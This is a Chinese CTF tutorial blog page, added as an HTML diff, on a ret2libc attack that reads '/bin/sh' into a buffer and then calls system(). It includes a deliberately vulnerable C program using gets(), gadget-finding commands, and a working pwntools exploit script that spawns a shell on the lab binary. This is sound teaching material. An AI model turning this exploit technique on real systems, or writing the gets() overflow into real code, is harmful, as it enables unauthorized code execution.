@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2libc攻击技术示例-仅有system()情况下输入“/bin/sh”完成函数调用</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2libc攻击技术示例-仅有system()情况下输入“/bin/sh”完成函数调用</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="情景描述">情景描述</h2>
+
+<p>当程序中并没有直接的<code class="highlighter-rouge">"/bin/sh"</code>字符串时，我们该如何通过ret2libc技术实现<code class="highlighter-rouge">system("/bin/sh")</code>的执行呢？这时我们就需要借助<code class="highlighter-rouge">gets</code> <code class="highlighter-rouge">read</code>之类的函数，读入我们输入的<code class="highlighter-rouge">"/bin/sh"</code>到缓冲区后，然后依照ret2libc1的套路一样，将<code class="highlighter-rouge">"/bin/sh"</code>的地址，也就是缓冲区的地址，模拟传入实现函数调用</p>
+
+<h2 id="示例代码">示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"no_shell_QQ"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Something surprise here, but I don't think it will work.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"What do you think ?"</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序可以在此处下载： <a href="http://od7mpc53s.bkt.clouddn.com/ret2libc2">ret2libc2</a></p>
+
+<p>程序依旧只开启了NX保护</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div></div>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>利用<code class="highlighter-rouge">gets()</code>函数，我们可以将<code class="highlighter-rouge">"/bin/sh"</code>写入到buf2中(buf1也可以)，但是这时需要注意，我们要合理设置<code class="highlighter-rouge">gets()</code>函数执行完后的返回地址，我们要保证函数执行完后依旧返回到rop链的下部分继续执行，因此我们需要一个gadget作为<code class="highlighter-rouge">gets()</code>返回地址。</p>
+
+<p>这样，当<code class="highlighter-rouge">gets()</code>读取”/bin/sh”写入到buf中后，将返回到一个gadget上，gadget继续ret可以返回到下一部分，而这部分我们构造为<code class="highlighter-rouge">system("/bin/sh")</code>，那么这样的rop chain构造合理，我们就可以成功获取一个shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2libc2 objdump <span class="nt">-dj</span> .plt ret2libc2 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"gets|system"</span>
+08048460 &lt;gets@plt&gt;:
+08048490 &lt;system@plt&gt;:
+➜  ret2libc2 ROPgadget <span class="nt">--binary</span> ret2libc2 <span class="nt">--only</span> <span class="s1">'pop|ret'</span>
+Gadgets information
+<span class="o">============================================================</span>
+......
+0x0804843d : pop ebx <span class="p">;</span> ret
+......
+
+Unique gadgets found: 7
+➜  ret2libc2 readelf <span class="nt">-s</span> ret2libc2 | <span class="nb">grep </span>buf2
+    59: 0804a080   100 OBJECT  GLOBAL DEFAULT   25 buf2
+</code></pre></div></div>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804843d</span>
+<span class="n">plt_gets</span> <span class="o">=</span> <span class="mh">0x08048460</span>
+<span class="n">plt_system</span> <span class="o">=</span> <span class="mh">0x08048490</span>
+<span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x0804a080</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">112</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2libc2'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/02/tmux/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8Csystem%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/02/tmux/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8Csystem%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
